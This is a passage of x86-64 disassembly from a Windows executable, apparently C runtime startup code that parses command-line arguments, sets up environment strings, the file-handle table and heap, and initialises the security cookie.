   140005675:	d1 e9                	shr    $1,%ecx
   140005677:	eb 11                	jmp    0x14000568a
   140005679:	ff c9                	dec    %ecx
   14000567b:	48 85 ff             	test   %rdi,%rdi
   14000567e:	74 06                	je     0x140005686
   140005680:	c6 07 5c             	movb   $0x5c,(%rdi)
   140005683:	48 ff c7             	inc    %rdi
   140005686:	41 ff 45 00          	incl   0x0(%r13)
   14000568a:	85 c9                	test   %ecx,%ecx
   14000568c:	75 eb                	jne    0x140005679
   14000568e:	8a 03                	mov    (%rbx),%al
   140005690:	84 c0                	test   %al,%al
   140005692:	74 4f                	je     0x1400056e3
   140005694:	85 f6                	test   %esi,%esi
   140005696:	75 08                	jne    0x1400056a0
   140005698:	3c 20                	cmp    $0x20,%al
   14000569a:	74 47                	je     0x1400056e3
   14000569c:	3c 09                	cmp    $0x9,%al
   14000569e:	74 43                	je     0x1400056e3
   1400056a0:	85 d2                	test   %edx,%edx
   1400056a2:	74 37                	je     0x1400056db
   1400056a4:	0f be c8             	movsbl %al,%ecx
   1400056a7:	e8 9c 2d 00 00       	call   0x140008448
   1400056ac:	48 85 ff             	test   %rdi,%rdi
   1400056af:	74 1b                	je     0x1400056cc
   1400056b1:	85 c0                	test   %eax,%eax
   1400056b3:	74 0e                	je     0x1400056c3
   1400056b5:	8a 03                	mov    (%rbx),%al
   1400056b7:	48 ff c3             	inc    %rbx
   1400056ba:	88 07                	mov    %al,(%rdi)
   1400056bc:	48 ff c7             	inc    %rdi
   1400056bf:	41 ff 45 00          	incl   0x0(%r13)
   1400056c3:	8a 03                	mov    (%rbx),%al
   1400056c5:	88 07                	mov    %al,(%rdi)
   1400056c7:	48 ff c7             	inc    %rdi
   1400056ca:	eb 0b                	jmp    0x1400056d7
   1400056cc:	85 c0                	test   %eax,%eax
   1400056ce:	74 07                	je     0x1400056d7
   1400056d0:	48 ff c3             	inc    %rbx
   1400056d3:	41 ff 45 00          	incl   0x0(%r13)
   1400056d7:	41 ff 45 00          	incl   0x0(%r13)
   1400056db:	48 ff c3             	inc    %rbx
   1400056de:	e9 59 ff ff ff       	jmp    0x14000563c
   1400056e3:	48 85 ff             	test   %rdi,%rdi
   1400056e6:	74 06                	je     0x1400056ee
   1400056e8:	c6 07 00             	movb   $0x0,(%rdi)
   1400056eb:	48 ff c7             	inc    %rdi
   1400056ee:	41 ff 45 00          	incl   0x0(%r13)
   1400056f2:	e9 14 ff ff ff       	jmp    0x14000560b
   1400056f7:	4d 85 e4             	test   %r12,%r12
   1400056fa:	74 05                	je     0x140005701
   1400056fc:	49 83 24 24 00       	andq   $0x0,(%r12)
   140005701:	41 ff 06             	incl   (%r14)
   140005704:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005709:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000570e:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005713:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140005718:	48 83 c4 20          	add    $0x20,%rsp
   14000571c:	41 5e                	pop    %r14
   14000571e:	41 5d                	pop    %r13
   140005720:	41 5c                	pop    %r12
   140005722:	c3                   	ret
   140005723:	cc                   	int3
   140005724:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005729:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000572e:	57                   	push   %rdi
   14000572f:	48 83 ec 30          	sub    $0x30,%rsp
   140005733:	83 3d 66 10 01 00 00 	cmpl   $0x0,0x11066(%rip)        # 0x1400167a0
   14000573a:	75 05                	jne    0x140005741
   14000573c:	e8 83 14 00 00       	call   0x140006bc4
   140005741:	48 8d 3d 18 fa 00 00 	lea    0xfa18(%rip),%rdi        # 0x140015160
   140005748:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000574e:	33 c9                	xor    %ecx,%ecx
   140005750:	48 8b d7             	mov    %rdi,%rdx
   140005753:	c6 05 0a fb 00 00 00 	movb   $0x0,0xfb0a(%rip)        # 0x140015264
   14000575a:	ff 15 b0 88 00 00    	call   *0x88b0(%rip)        # 0x14000e010
   140005760:	48 8b 1d 19 10 01 00 	mov    0x11019(%rip),%rbx        # 0x140016780
   140005767:	48 89 3d 8a ee 00 00 	mov    %rdi,0xee8a(%rip)        # 0x1400145f8
   14000576e:	48 85 db             	test   %rbx,%rbx
   140005771:	74 05                	je     0x140005778
   140005773:	80 3b 00             	cmpb   $0x0,(%rbx)
   140005776:	75 03                	jne    0x14000577b
   140005778:	48 8b df             	mov    %rdi,%rbx
   14000577b:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140005780:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140005785:	45 33 c0             	xor    %r8d,%r8d
   140005788:	33 d2                	xor    %edx,%edx
   14000578a:	48 8b cb             	mov    %rbx,%rcx
   14000578d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005792:	e8 bd fd ff ff       	call   0x140005554
   140005797:	48 63 74 24 40       	movslq 0x40(%rsp),%rsi
   14000579c:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   1400057a3:	ff ff 1f 
   1400057a6:	48 3b f1             	cmp    %rcx,%rsi
   1400057a9:	73 5c                	jae    0x140005807
   1400057ab:	48 63 4c 24 48       	movslq 0x48(%rsp),%rcx
   1400057b0:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   1400057b4:	73 51                	jae    0x140005807
   1400057b6:	48 8d 14 f1          	lea    (%rcx,%rsi,8),%rdx
   1400057ba:	48 3b d1             	cmp    %rcx,%rdx
   1400057bd:	72 48                	jb     0x140005807
   1400057bf:	48 8b ca             	mov    %rdx,%rcx
   1400057c2:	e8 7d 06 00 00       	call   0x140005e44
   1400057c7:	48 8b f8             	mov    %rax,%rdi
   1400057ca:	48 85 c0             	test   %rax,%rax
   1400057cd:	74 38                	je     0x140005807
   1400057cf:	4c 8d 04 f0          	lea    (%rax,%rsi,8),%r8
   1400057d3:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400057d8:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400057dd:	48 8b d7             	mov    %rdi,%rdx
   1400057e0:	48 8b cb             	mov    %rbx,%rcx
   1400057e3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400057e8:	e8 67 fd ff ff       	call   0x140005554
   1400057ed:	44 8b 5c 24 40       	mov    0x40(%rsp),%r11d
   1400057f2:	48 89 3d cf ed 00 00 	mov    %rdi,0xedcf(%rip)        # 0x1400145c8
   1400057f9:	41 ff cb             	dec    %r11d
   1400057fc:	33 c0                	xor    %eax,%eax
   1400057fe:	44 89 1d bf ed 00 00 	mov    %r11d,0xedbf(%rip)        # 0x1400145c4
   140005805:	eb 03                	jmp    0x14000580a
   140005807:	83 c8 ff             	or     $0xffffffff,%eax
   14000580a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000580f:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140005814:	48 83 c4 30          	add    $0x30,%rsp
   140005818:	5f                   	pop    %rdi
   140005819:	c3                   	ret
   14000581a:	cc                   	int3
   14000581b:	cc                   	int3
   14000581c:	48 8b c4             	mov    %rsp,%rax
   14000581f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005823:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005827:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000582b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000582f:	41 54                	push   %r12
   140005831:	48 83 ec 40          	sub    $0x40,%rsp
   140005835:	8b 0d 2d fa 00 00    	mov    0xfa2d(%rip),%ecx        # 0x140015268
   14000583b:	45 33 e4             	xor    %r12d,%r12d
   14000583e:	49 8b dc             	mov    %r12,%rbx
   140005841:	41 8d 74 24 02       	lea    0x2(%r12),%esi
   140005846:	41 3b cc             	cmp    %r12d,%ecx
   140005849:	75 32                	jne    0x14000587d
   14000584b:	ff 15 af 89 00 00    	call   *0x89af(%rip)        # 0x14000e200
   140005851:	48 8b d8             	mov    %rax,%rbx
   140005854:	49 3b c4             	cmp    %r12,%rax
   140005857:	74 0c                	je     0x140005865
   140005859:	c7 05 05 fa 00 00 01 	movl   $0x1,0xfa05(%rip)        # 0x140015268
   140005860:	00 00 00 
   140005863:	eb 21                	jmp    0x140005886
   140005865:	ff 15 e5 87 00 00    	call   *0x87e5(%rip)        # 0x14000e050
   14000586b:	8b 0d f7 f9 00 00    	mov    0xf9f7(%rip),%ecx        # 0x140015268
   140005871:	83 f8 78             	cmp    $0x78,%eax
   140005874:	0f 44 ce             	cmove  %esi,%ecx
   140005877:	89 0d eb f9 00 00    	mov    %ecx,0xf9eb(%rip)        # 0x140015268
   14000587d:	83 f9 01             	cmp    $0x1,%ecx
   140005880:	0f 85 ba 00 00 00    	jne    0x140005940
   140005886:	49 3b dc             	cmp    %r12,%rbx
   140005889:	75 15                	jne    0x1400058a0
   14000588b:	ff 15 6f 89 00 00    	call   *0x896f(%rip)        # 0x14000e200
   140005891:	48 8b d8             	mov    %rax,%rbx
   140005894:	49 3b c4             	cmp    %r12,%rax
   140005897:	75 07                	jne    0x1400058a0
   140005899:	33 c0                	xor    %eax,%eax
   14000589b:	e9 13 01 00 00       	jmp    0x1400059b3
   1400058a0:	48 8b fb             	mov    %rbx,%rdi
   1400058a3:	66 44 39 23          	cmp    %r12w,(%rbx)
   1400058a7:	74 12                	je     0x1400058bb
   1400058a9:	48 03 fe             	add    %rsi,%rdi
   1400058ac:	66 44 39 27          	cmp    %r12w,(%rdi)
   1400058b0:	75 f7                	jne    0x1400058a9
   1400058b2:	48 03 fe             	add    %rsi,%rdi
   1400058b5:	66 44 39 27          	cmp    %r12w,(%rdi)
   1400058b9:	75 ee                	jne    0x1400058a9
   1400058bb:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   1400058c0:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   1400058c5:	48 2b fb             	sub    %rbx,%rdi
   1400058c8:	48 d1 ff             	sar    $1,%rdi
   1400058cb:	4c 8b c3             	mov    %rbx,%r8
   1400058ce:	33 d2                	xor    %edx,%edx
   1400058d0:	44 8d 4f 01          	lea    0x1(%rdi),%r9d
   1400058d4:	33 c9                	xor    %ecx,%ecx
   1400058d6:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   1400058db:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400058e0:	ff 15 12 89 00 00    	call   *0x8912(%rip)        # 0x14000e1f8
   1400058e6:	48 63 e8             	movslq %eax,%rbp
   1400058e9:	41 3b ec             	cmp    %r12d,%ebp
   1400058ec:	74 41                	je     0x14000592f
   1400058ee:	48 8b cd             	mov    %rbp,%rcx
   1400058f1:	e8 4e 05 00 00       	call   0x140005e44
   1400058f6:	48 8b f0             	mov    %rax,%rsi
   1400058f9:	49 3b c4             	cmp    %r12,%rax
   1400058fc:	74 31                	je     0x14000592f
   1400058fe:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   140005903:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   140005908:	44 8d 4f 01          	lea    0x1(%rdi),%r9d
   14000590c:	4c 8b c3             	mov    %rbx,%r8
   14000590f:	33 d2                	xor    %edx,%edx
   140005911:	33 c9                	xor    %ecx,%ecx
   140005913:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140005917:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000591c:	ff 15 d6 88 00 00    	call   *0x88d6(%rip)        # 0x14000e1f8
   140005922:	41 3b c4             	cmp    %r12d,%eax
   140005925:	75 0b                	jne    0x140005932
   140005927:	48 8b ce             	mov    %rsi,%rcx
   14000592a:	e8 e9 d0 ff ff       	call   0x140002a18
   14000592f:	49 8b f4             	mov    %r12,%rsi
   140005932:	48 8b cb             	mov    %rbx,%rcx
   140005935:	ff 15 b5 88 00 00    	call   *0x88b5(%rip)        # 0x14000e1f0
   14000593b:	48 8b c6             	mov    %rsi,%rax
   14000593e:	eb 73                	jmp    0x1400059b3
   140005940:	3b ce                	cmp    %esi,%ecx
   140005942:	74 09                	je     0x14000594d
   140005944:	41 3b cc             	cmp    %r12d,%ecx
   140005947:	0f 85 4c ff ff ff    	jne    0x140005899
   14000594d:	ff 15 95 88 00 00    	call   *0x8895(%rip)        # 0x14000e1e8
   140005953:	48 8b d8             	mov    %rax,%rbx
   140005956:	49 3b c4             	cmp    %r12,%rax
   140005959:	0f 84 3a ff ff ff    	je     0x140005899
   14000595f:	44 38 20             	cmp    %r12b,(%rax)
   140005962:	74 10                	je     0x140005974
   140005964:	48 ff c0             	inc    %rax
   140005967:	44 38 20             	cmp    %r12b,(%rax)
   14000596a:	75 f8                	jne    0x140005964
   14000596c:	48 ff c0             	inc    %rax
   14000596f:	44 38 20             	cmp    %r12b,(%rax)
   140005972:	75 f0                	jne    0x140005964
   140005974:	2b c3                	sub    %ebx,%eax
   140005976:	ff c0                	inc    %eax
   140005978:	48 63 f0             	movslq %eax,%rsi
   14000597b:	48 8b ce             	mov    %rsi,%rcx
   14000597e:	e8 c1 04 00 00       	call   0x140005e44
   140005983:	48 8b f8             	mov    %rax,%rdi
   140005986:	49 3b c4             	cmp    %r12,%rax
   140005989:	75 0e                	jne    0x140005999
   14000598b:	48 8b cb             	mov    %rbx,%rcx
   14000598e:	ff 15 4c 88 00 00    	call   *0x884c(%rip)        # 0x14000e1e0
   140005994:	e9 00 ff ff ff       	jmp    0x140005899
   140005999:	4c 8b c6             	mov    %rsi,%r8
   14000599c:	48 8b d3             	mov    %rbx,%rdx
   14000599f:	48 8b c8             	mov    %rax,%rcx
   1400059a2:	e8 c9 d1 ff ff       	call   0x140002b70
   1400059a7:	48 8b cb             	mov    %rbx,%rcx
   1400059aa:	ff 15 30 88 00 00    	call   *0x8830(%rip)        # 0x14000e1e0
   1400059b0:	48 8b c7             	mov    %rdi,%rax
   1400059b3:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400059b8:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400059bd:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400059c2:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400059c7:	48 83 c4 40          	add    $0x40,%rsp
   1400059cb:	41 5c                	pop    %r12
   1400059cd:	c3                   	ret
   1400059ce:	cc                   	int3
   1400059cf:	cc                   	int3
   1400059d0:	48 8b c4             	mov    %rsp,%rax
   1400059d3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400059d7:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400059db:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400059df:	4c 89 60 20          	mov    %r12,0x20(%rax)
   1400059e3:	41 55                	push   %r13
   1400059e5:	41 56                	push   %r14
   1400059e7:	41 57                	push   %r15
   1400059e9:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400059f0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400059f5:	ff 15 05 87 00 00    	call   *0x8705(%rip)        # 0x14000e100
   1400059fb:	90                   	nop
   1400059fc:	ba 58 00 00 00       	mov    $0x58,%edx
   140005a01:	44 8d 62 c8          	lea    -0x38(%rdx),%r12d
   140005a05:	49 8b cc             	mov    %r12,%rcx
   140005a08:	e8 a3 04 00 00       	call   0x140005eb0
   140005a0d:	4c 8b d8             	mov    %rax,%r11
   140005a10:	45 33 ff             	xor    %r15d,%r15d
   140005a13:	49 3b c7             	cmp    %r15,%rax
   140005a16:	75 08                	jne    0x140005a20
   140005a18:	83 c8 ff             	or     $0xffffffff,%eax
   140005a1b:	e9 7b 02 00 00       	jmp    0x140005c9b
   140005a20:	48 89 05 59 0b 01 00 	mov    %rax,0x10b59(%rip)        # 0x140016580
   140005a27:	41 8b cc             	mov    %r12d,%ecx
   140005a2a:	89 0d 38 0b 01 00    	mov    %ecx,0x10b38(%rip)        # 0x140016568
   140005a30:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140005a36:	4c 3b d8             	cmp    %rax,%r11
   140005a39:	73 43                	jae    0x140005a7e
   140005a3b:	45 88 7b 08          	mov    %r15b,0x8(%r11)
   140005a3f:	49 83 0b ff          	orq    $0xffffffffffffffff,(%r11)
   140005a43:	41 c6 43 09 0a       	movb   $0xa,0x9(%r11)
   140005a48:	45 89 7b 0c          	mov    %r15d,0xc(%r11)
   140005a4c:	45 88 7b 38          	mov    %r15b,0x38(%r11)
   140005a50:	41 c6 43 39 0a       	movb   $0xa,0x39(%r11)
   140005a55:	41 c6 43 3a 0a       	movb   $0xa,0x3a(%r11)
   140005a5a:	45 89 7b 50          	mov    %r15d,0x50(%r11)
   140005a5e:	45 88 7b 4c          	mov    %r15b,0x4c(%r11)
   140005a62:	49 83 c3 58          	add    $0x58,%r11
   140005a66:	48 8b 05 13 0b 01 00 	mov    0x10b13(%rip),%rax        # 0x140016580
   140005a6d:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140005a73:	4c 3b d8             	cmp    %rax,%r11
   140005a76:	72 c3                	jb     0x140005a3b
   140005a78:	8b 0d ea 0a 01 00    	mov    0x10aea(%rip),%ecx        # 0x140016568
   140005a7e:	66 44 39 7c 24 62    	cmp    %r15w,0x62(%rsp)
   140005a84:	0f 84 49 01 00 00    	je     0x140005bd3
   140005a8a:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140005a8f:	49 3b c7             	cmp    %r15,%rax
   140005a92:	0f 84 3b 01 00 00    	je     0x140005bd3
   140005a98:	4c 8d 68 04          	lea    0x4(%rax),%r13
   140005a9c:	48 63 30             	movslq (%rax),%rsi
   140005a9f:	49 03 f5             	add    %r13,%rsi
   140005aa2:	bb 00 08 00 00       	mov    $0x800,%ebx
   140005aa7:	39 18                	cmp    %ebx,(%rax)
   140005aa9:	0f 4c 18             	cmovl  (%rax),%ebx
   140005aac:	bf 01 00 00 00       	mov    $0x1,%edi
   140005ab1:	3b cb                	cmp    %ebx,%ecx
   140005ab3:	0f 8d 8d 00 00 00    	jge    0x140005b46
   140005ab9:	4c 8d 35 c0 0a 01 00 	lea    0x10ac0(%rip),%r14        # 0x140016580
   140005ac0:	ba 58 00 00 00       	mov    $0x58,%edx
   140005ac5:	49 8b cc             	mov    %r12,%rcx
   140005ac8:	e8 e3 03 00 00       	call   0x140005eb0
   140005acd:	4c 8b d8             	mov    %rax,%r11
   140005ad0:	49 3b c7             	cmp    %r15,%rax
   140005ad3:	74 69                	je     0x140005b3e
   140005ad5:	49 89 04 fe          	mov    %rax,(%r14,%rdi,8)
   140005ad9:	8b 05 89 0a 01 00    	mov    0x10a89(%rip),%eax        # 0x140016568
   140005adf:	41 03 c4             	add    %r12d,%eax
   140005ae2:	89 05 80 0a 01 00    	mov    %eax,0x10a80(%rip)        # 0x140016568
   140005ae8:	49 8d 8b 00 0b 00 00 	lea    0xb00(%r11),%rcx
   140005aef:	4c 3b d9             	cmp    %rcx,%r11
   140005af2:	73 41                	jae    0x140005b35
   140005af4:	45 88 7b 08          	mov    %r15b,0x8(%r11)
   140005af8:	49 83 0b ff          	orq    $0xffffffffffffffff,(%r11)
   140005afc:	41 c6 43 09 0a       	movb   $0xa,0x9(%r11)
   140005b01:	45 89 7b 0c          	mov    %r15d,0xc(%r11)
   140005b05:	41 80 63 38 80       	andb   $0x80,0x38(%r11)
   140005b0a:	41 c6 43 39 0a       	movb   $0xa,0x39(%r11)
   140005b0f:	41 c6 43 3a 0a       	movb   $0xa,0x3a(%r11)
   140005b14:	45 89 7b 50          	mov    %r15d,0x50(%r11)
   140005b18:	45 88 7b 4c          	mov    %r15b,0x4c(%r11)
   140005b1c:	49 83 c3 58          	add    $0x58,%r11
   140005b20:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   140005b24:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140005b2a:	4c 3b d8             	cmp    %rax,%r11
   140005b2d:	72 c5                	jb     0x140005af4
   140005b2f:	8b 05 33 0a 01 00    	mov    0x10a33(%rip),%eax        # 0x140016568
   140005b35:	48 ff c7             	inc    %rdi
   140005b38:	3b c3                	cmp    %ebx,%eax
   140005b3a:	7c 84                	jl     0x140005ac0
   140005b3c:	eb 0f                	jmp    0x140005b4d
   140005b3e:	8b 1d 24 0a 01 00    	mov    0x10a24(%rip),%ebx        # 0x140016568
   140005b44:	eb 07                	jmp    0x140005b4d
   140005b46:	4c 8d 35 33 0a 01 00 	lea    0x10a33(%rip),%r14        # 0x140016580
   140005b4d:	41 8b ff             	mov    %r15d,%edi
   140005b50:	41 3b df             	cmp    %r15d,%ebx
   140005b53:	7e 7e                	jle    0x140005bd3
   140005b55:	48 83 3e ff          	cmpq   $0xffffffffffffffff,(%rsi)
   140005b59:	74 6b                	je     0x140005bc6
   140005b5b:	48 83 3e fe          	cmpq   $0xfffffffffffffffe,(%rsi)
   140005b5f:	74 65                	je     0x140005bc6
   140005b61:	41 f6 45 00 01       	testb  $0x1,0x0(%r13)
   140005b66:	74 5e                	je     0x140005bc6
   140005b68:	41 f6 45 00 08       	testb  $0x8,0x0(%r13)
   140005b6d:	75 0e                	jne    0x140005b7d
   140005b6f:	48 8b 0e             	mov    (%rsi),%rcx
   140005b72:	ff 15 98 86 00 00    	call   *0x8698(%rip)        # 0x14000e210
   140005b78:	41 3b c7             	cmp    %r15d,%eax
   140005b7b:	74 49                	je     0x140005bc6
   140005b7d:	4c 63 e7             	movslq %edi,%r12
   140005b80:	49 8b c4             	mov    %r12,%rax
   140005b83:	48 c1 f8 05          	sar    $0x5,%rax
   140005b87:	41 83 e4 1f          	and    $0x1f,%r12d
   140005b8b:	4d 6b e4 58          	imul   $0x58,%r12,%r12
   140005b8f:	4d 03 24 c6          	add    (%r14,%rax,8),%r12
   140005b93:	48 8b 06             	mov    (%rsi),%rax
   140005b96:	49 89 04 24          	mov    %rax,(%r12)
   140005b9a:	41 8a 45 00          	mov    0x0(%r13),%al
   140005b9e:	41 88 44 24 08       	mov    %al,0x8(%r12)
   140005ba3:	49 8d 4c 24 10       	lea    0x10(%r12),%rcx
   140005ba8:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140005bad:	e8 06 e9 ff ff       	call   0x1400044b8
   140005bb2:	41 3b c7             	cmp    %r15d,%eax
   140005bb5:	74 07                	je     0x140005bbe
   140005bb7:	41 ff 44 24 0c       	incl   0xc(%r12)
   140005bbc:	eb 08                	jmp    0x140005bc6
   140005bbe:	83 c8 ff             	or     $0xffffffff,%eax
   140005bc1:	e9 d5 00 00 00       	jmp    0x140005c9b
   140005bc6:	ff c7                	inc    %edi
   140005bc8:	49 ff c5             	inc    %r13
   140005bcb:	48 83 c6 08          	add    $0x8,%rsi
   140005bcf:	3b fb                	cmp    %ebx,%edi
   140005bd1:	7c 82                	jl     0x140005b55
   140005bd3:	45 8b e7             	mov    %r15d,%r12d
   140005bd6:	49 8b ff             	mov    %r15,%rdi
   140005bd9:	48 8b df             	mov    %rdi,%rbx
   140005bdc:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   140005be0:	48 03 1d 99 09 01 00 	add    0x10999(%rip),%rbx        # 0x140016580
   140005be7:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140005beb:	74 0c                	je     0x140005bf9
   140005bed:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140005bf1:	74 06                	je     0x140005bf9
   140005bf3:	80 4b 08 80          	orb    $0x80,0x8(%rbx)
   140005bf7:	eb 7f                	jmp    0x140005c78
   140005bf9:	c6 43 08 81          	movb   $0x81,0x8(%rbx)
   140005bfd:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   140005c02:	f7 d8                	neg    %eax
   140005c04:	1b c9                	sbb    %ecx,%ecx
   140005c06:	83 c1 f5             	add    $0xfffffff5,%ecx
   140005c09:	b8 f6 ff ff ff       	mov    $0xfffffff6,%eax
   140005c0e:	45 3b e7             	cmp    %r15d,%r12d
   140005c11:	0f 44 c8             	cmove  %eax,%ecx
   140005c14:	ff 15 96 85 00 00    	call   *0x8596(%rip)        # 0x14000e1b0
   140005c1a:	48 8b f0             	mov    %rax,%rsi
   140005c1d:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005c21:	74 4a                	je     0x140005c6d
   140005c23:	49 3b c7             	cmp    %r15,%rax
   140005c26:	74 45                	je     0x140005c6d
   140005c28:	48 8b c8             	mov    %rax,%rcx
   140005c2b:	ff 15 df 85 00 00    	call   *0x85df(%rip)        # 0x14000e210
   140005c31:	41 3b c7             	cmp    %r15d,%eax
   140005c34:	74 37                	je     0x140005c6d
   140005c36:	48 89 33             	mov    %rsi,(%rbx)
   140005c39:	0f b6 c0             	movzbl %al,%eax
   140005c3c:	83 f8 02             	cmp    $0x2,%eax
   140005c3f:	75 06                	jne    0x140005c47
   140005c41:	80 4b 08 40          	orb    $0x40,0x8(%rbx)
   140005c45:	eb 09                	jmp    0x140005c50
   140005c47:	83 f8 03             	cmp    $0x3,%eax
   140005c4a:	75 04                	jne    0x140005c50
   140005c4c:	80 4b 08 08          	orb    $0x8,0x8(%rbx)
   140005c50:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   140005c54:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140005c59:	e8 5a e8 ff ff       	call   0x1400044b8
   140005c5e:	41 3b c7             	cmp    %r15d,%eax
   140005c61:	74 05                	je     0x140005c68
   140005c63:	ff 43 0c             	incl   0xc(%rbx)
   140005c66:	eb 10                	jmp    0x140005c78
   140005c68:	83 c8 ff             	or     $0xffffffff,%eax
   140005c6b:	eb 2e                	jmp    0x140005c9b
   140005c6d:	80 4b 08 40          	orb    $0x40,0x8(%rbx)
   140005c71:	48 c7 03 fe ff ff ff 	movq   $0xfffffffffffffffe,(%rbx)
   140005c78:	41 ff c4             	inc    %r12d
   140005c7b:	48 ff c7             	inc    %rdi
   140005c7e:	48 83 ff 03          	cmp    $0x3,%rdi
   140005c82:	0f 8c 51 ff ff ff    	jl     0x140005bd9
   140005c88:	8b 0d da 08 01 00    	mov    0x108da(%rip),%ecx        # 0x140016568
   140005c8e:	ff 15 74 85 00 00    	call   *0x8574(%rip)        # 0x14000e208
   140005c94:	33 c0                	xor    %eax,%eax
   140005c96:	eb 03                	jmp    0x140005c9b
   140005c98:	83 c8 ff             	or     $0xffffffff,%eax
   140005c9b:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140005ca2:	00 
   140005ca3:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140005ca7:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140005cab:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140005caf:	4d 8b 63 38          	mov    0x38(%r11),%r12
   140005cb3:	49 8b e3             	mov    %r11,%rsp
   140005cb6:	41 5f                	pop    %r15
   140005cb8:	41 5e                	pop    %r14
   140005cba:	41 5d                	pop    %r13
   140005cbc:	c3                   	ret
   140005cbd:	cc                   	int3
   140005cbe:	cc                   	int3
   140005cbf:	cc                   	int3
   140005cc0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140005cc4:	48 83 ec 28          	sub    $0x28,%rsp
   140005cc8:	45 33 c0             	xor    %r8d,%r8d
   140005ccb:	ba 00 10 00 00       	mov    $0x1000,%edx
   140005cd0:	33 c9                	xor    %ecx,%ecx
   140005cd2:	ff 15 48 85 00 00    	call   *0x8548(%rip)        # 0x14000e220
   140005cd8:	48 89 05 91 f5 00 00 	mov    %rax,0xf591(%rip)        # 0x140015270
   140005cdf:	48 85 c0             	test   %rax,%rax
   140005ce2:	74 23                	je     0x140005d07
   140005ce4:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005ce9:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140005cef:	33 d2                	xor    %edx,%edx
   140005cf1:	48 8b c8             	mov    %rax,%rcx
   140005cf4:	c7 44 24 30 02 00 00 	movl   $0x2,0x30(%rsp)
   140005cfb:	00 
   140005cfc:	ff 15 16 85 00 00    	call   *0x8516(%rip)        # 0x14000e218
   140005d02:	b8 01 00 00 00       	mov    $0x1,%eax
   140005d07:	48 83 c4 28          	add    $0x28,%rsp
   140005d0b:	c3                   	ret
   140005d0c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005d11:	57                   	push   %rdi
   140005d12:	48 83 ec 20          	sub    $0x20,%rsp
   140005d16:	48 8b 05 2b d3 00 00 	mov    0xd32b(%rip),%rax        # 0x140013048
   140005d1d:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140005d23:	48 bf 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rdi
   140005d2a:	2b 00 00 
   140005d2d:	48 3b c7             	cmp    %rdi,%rax
   140005d30:	74 0c                	je     0x140005d3e
   140005d32:	48 f7 d0             	not    %rax
   140005d35:	48 89 05 14 d3 00 00 	mov    %rax,0xd314(%rip)        # 0x140013050
   140005d3c:	eb 76                	jmp    0x140005db4
   140005d3e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005d43:	ff 15 7f 83 00 00    	call   *0x837f(%rip)        # 0x14000e0c8
   140005d49:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005d4e:	ff 15 e4 84 00 00    	call   *0x84e4(%rip)        # 0x14000e238
   140005d54:	44 8b d8             	mov    %eax,%r11d
   140005d57:	49 33 db             	xor    %r11,%rbx
   140005d5a:	ff 15 38 84 00 00    	call   *0x8438(%rip)        # 0x14000e198
   140005d60:	44 8b d8             	mov    %eax,%r11d
   140005d63:	49 33 db             	xor    %r11,%rbx
   140005d66:	ff 15 c4 84 00 00    	call   *0x84c4(%rip)        # 0x14000e230
